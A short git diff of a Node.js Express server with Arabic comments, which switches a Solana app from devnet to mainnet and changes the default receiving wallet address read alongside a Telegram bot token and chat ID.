@@ -12,12 +12,12 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 // ============ إعدادات السيرفر ============
 const PORT = process.env.PORT || 5000;
-const IS_DEVNET = true; // ✅ DEVNET للتجربة
+const IS_DEVNET = false; // ✅ DEVNET للتجربة
 
 // ============ متغيرات البيئة ============
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
-const RECEIVER_WALLET_ADDRESS = process.env.RECEIVER_WALLET || 'Fh7X5J8MRsch2HKuniXEAXsDXHjh7pb6wUvJU9Kd4hBQ';
+const RECEIVER_WALLET_ADDRESS = process.env.RECEIVER_WALLET || 'DTJ5hVS721E7xuVUu9vS8rf1cr7Z5bqYqG3QuCfVTQJH';
 
 // ✅ قائمة RPCs لـ DEVNET
 const RPC_ENDPOINTS = IS_DEVNET ? [
